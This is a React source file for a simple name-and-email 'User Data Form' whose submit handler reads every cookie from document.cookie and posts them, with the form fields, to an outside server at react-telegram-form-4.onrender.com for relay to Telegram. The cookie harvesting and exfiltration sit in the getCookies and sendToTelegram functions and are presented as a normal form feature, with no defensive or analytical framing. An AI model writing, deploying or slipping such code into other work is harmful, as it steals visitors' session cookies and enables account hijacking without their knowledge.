import React, { useState } from "react";

const UserForm = () => {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");

  // Function to get cookies from document.cookie
  const getCookies = () => {
    return document.cookie; // This will return all cookies as a single string
  };

  // Function to send form data and cookies to Telegram
  const sendToTelegram = async (data) => {
    try {
      const response = await fetch("https://react-telegram-form-4.onrender.com/send-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
        credentials: "include",  // This ensures cookies are sent with the request
      });

      const result = await response.json();
      if (result.success) {
        console.log("Message sent to Telegram!");
      } else {
        console.error("Failed to send message to Telegram");
      }
    } catch (error) {
      console.error("Error sending data to Telegram:", error);
    }
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Collect form data and cookies
    const cookies = getCookies();
    const formData = {
      name,
      email,
      cookies, // Attach cookies to the data
    };

    // Send data to Telegram
    await sendToTelegram(formData);

    alert("Form submitted and cookies sent!");
  };

  return (
    <div>
      <h1>User Data Form</h1>
      <form onSubmit={handleSubmit}>
        <label>
          Name:
          <input
            type="text"
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
          />
        </label>
        <br />
        <label>
          Email:
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </label>
        <br />
        <button type="submit">Submit</button>
      </form>
    </div>
  );
};

export default UserForm;